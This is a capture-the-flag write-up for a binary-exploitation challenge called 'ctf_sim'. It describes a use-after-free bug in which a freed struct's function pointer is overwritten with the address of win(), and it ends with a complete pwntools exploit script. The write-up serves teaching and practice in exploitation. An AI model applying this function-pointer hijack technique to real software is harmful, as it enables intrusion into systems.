# CTF_sim: 356

This was a uaf based challenge that I solved after the CTF. I'll now take you through it.

## Preliminary analysis:
```
ctf_sim: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2761071c48f75292676a4dabec103db701a4cee3, not stripped
```
```
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
gef➤  
```
As we can see, only NX bit is enabled, and it is a 64-bit dynamically linked binary. Let us move onto analyzing the binary. 

As we run the binary, we see 4 options - download challenge, solve challenge, submit writeup for challenge, and exit. 
```
CTF SIM
1. Download a Challenge
2. Solve a Challenge
3. Submit a writeup
4. Quit
> 
```
The following functions:
- `download challenge()` provides us a choice to choose one of the categories, (all the challenges are structures which contain a function), and saves it into a `downloaded` array, however the maximum index we can reach is 3, which means we can download atmost 3 challenges. 
- `solve challenge()` calls the fucntion `solve` of the structure, and then frees the allocated area of the structure. Libc version used is: `ldd (Ubuntu GLIBC 2.31-0ubuntu9.7) 2.31`. One thing to notice here is that, we can reuse the same chunk by requesting a chunk of the same size. After freeing it, we can reuse to point to win, thus when the function solve() is called again inside the structure, the pointer to win() will call the win() function instead. 
This cane be seen from the line: `downloaded[index] -> solve();` 
Hence making use of the UAF bug available.
- `submit writeup()` takes input from the reader. Here, we submit a writeup of 16 bytes, and provide the pointer to win() function as our payload. 
    
Thus our process involves:
- download a challenge, store it at any index.
- solve the challenge download, so as to free the allocated area of the strcture.
- submit writeup for the solved challenge, (providing a pointer to win() as the paylaod so that, when solve() function is called again, win() will be called instead.)
- solve the same downloaded and freed challenge again, so as to call win() this time.
    
## Exploit:
```
def download(cat, ind):
	p.recv()
	p.sendline('1')
	p.sendline(bytes(cat))
	p.sendline(bytes(ind))

def solve_chall(ind):
	p.recv()
	p.sendline('2')
	p.sendline(bytes(ind))
	
def writeup(length, content):
	p.recv()
	p.sendline('3')
	p.sendline(bytes(length))
	p.sendline(content)

from pwn import *

#p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")
p = process('./ctf_sim')
gdb.attach(p)
win_ptr = 0x404088

download(1, 1)

solve_chall(1)

pay = p64(win_ptr)
writeup(16, pay)

solve_chall(1)	

p.interactive()
```


